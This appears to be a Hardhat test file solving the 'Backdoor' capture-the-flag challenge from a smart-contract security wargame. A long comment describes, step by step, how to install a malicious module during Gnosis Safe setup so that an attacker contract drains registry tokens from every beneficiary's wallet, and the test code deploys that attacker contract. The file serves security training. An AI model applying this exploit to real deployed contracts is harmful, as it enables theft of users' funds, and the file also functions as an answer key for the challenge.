const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, player;
    let masterCopy, walletFactory, token, walletRegistry;

    const AMOUNT_TOKENS_DISTRIBUTED = 40n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            masterCopy.address,
            walletFactory.address,
            token.address,
            users
        );
        expect(await walletRegistry.owner()).to.eq(deployer.address);

        for (let i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.true;

            // User cannot add beneficiaries
            await expect(
                walletRegistry.connect(
                    await ethers.getSigner(users[i])
                ).addBeneficiary(users[i])
            ).to.be.revertedWithCustomError(walletRegistry, 'Unauthorized');
        }

        // Transfer tokens to be distributed to the registry
        await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    /**
     * @dev
     * Exploit Overview:
     * 
     * This challenge introduces the idea of proxy contracts and singleton 
     * contracts.
     * 
     * The way this works is that you can have a factory contract which deploys 
     * proxies to the Gnosis Safe singleton contract. This essentially means
     * that the proxy offloads all logic to the singleton contract with the
     * context of the proxy state. It does this through delegate calls.
     * 
     * Factory CALLS -> Proxy DELEGATECALLS -> Singleton Gnosis Safe
     * 
     * Now we can create new Gnosis safes with anyone as the owner which means
     * we can create a safe on the behalf of the beneficiaries and then 
     * ensure the factory calls back to the WalletRegistry contract. During
     * this callback the contract will transfer 10 DVT to the newly created
     * Gnosis safe. However we are unable to access it since it is solely owned
     * by one of the beneficiaries. 
     * 
     * To get around this we can install a backdoor module into the Gnosis safe
     * on initialization which DOES NOT require the signatures of the owners on
     * deployment only (if you try to add a module after deployment it does
     * require signatures).
     * 
     * You can exploit this via execTransactionFromModule() or even more simply,
     * you can run the exploit on the initialisation code of your module. Within 
     * this code you can approve the attacker/smart contract to spend the funds
     * of the Gnosis wallet.
     * 
     * Most of the logic is placed in the Smart Contract to allow this to happen
     * in one transaction. But essentially it goes:
     * 
     * 1. Deploy malicious contract
     * 2. Generate the ABI to call the setupToken() function in the malicious contract
     * 3. exploit(): Call exploit with the above ABI and the list of users
     * 4. exploit(): Generate the ABI to setup the new Gnosis wallet with the ABI from step 2
     *                  such that the callback address and function is the wallet registry
     * 5. exploit(): Call the ProxyFactory contract with the ABI from step 4 and a few other bobs
     *              with a callback to the WalletRegistry proxyCreated() function.
     * 6. createProxyWithCallback(): Deploys the new Proxy and calls setup() on the proxy
     * 7. setup(): New proxy is setup and sets up the module calling back to the malicous contract
     *              however this time is a delegate call meaning it is executed in the context
     *              of the newly create proxy contract.
     * 8. setupToken(): [proxy context] Approve 10 ether to be spent by the malicious contract
     *                  of the proxies token funds
     * 9. proxyCreated(): Callback executed on the wallet registry and passes checks and transfers
     *                      10 ether to the newly created wallet
     * 10. exploit(): Transfer the 10 ether from the Gnosis wallet to the attacker address
     * 11. Repeat for each beneficiary from within the contract and hence 1 transaction.
     * 
     * Attack contract is available at:
     * "contracts/attacker-contracts/AttackBackdoor.sol"
     */
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const attackerToken = token.connect(player);
        const attackerFactory = walletFactory.connect(player);
        const attackerMasterCopy = masterCopy.connect(player);
        const attackerWalletRegistry = walletRegistry.connect(player);

        // Helper Function
        const checkTokenBalance = async (address, name) => {
            const tokenBal = await attackerToken.balanceOf(address);
            console.log(`TOKEN Balance of ${name}`, ethers.utils.formatEther(tokenBal));
        }

        await checkTokenBalance(player.address, "Attacker");

        // Deploy attacking contract
        // Do exploit in one transaction in contract constructor

        const AttackModuleFactory = await ethers.getContractFactory("AttackBackdoor", player);
        const attackModule = await AttackModuleFactory.deploy(
            player.address,
            attackerFactory.address,
            attackerMasterCopy.address,
            attackerWalletRegistry.address,
            attackerToken.address,
            users,
            {
                gasLimit: 1e7
            }
        );
        console.log("Deployed attacking contract at", attackModule.address);
        await checkTokenBalance(player.address, "Attacker");

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player must have used a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);

        for (let i = 0; i < users.length; i++) {
            let wallet = await walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(
                ethers.constants.AddressZero,
                'User did not register a wallet'
            );

            // User is no longer registered as a beneficiary
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
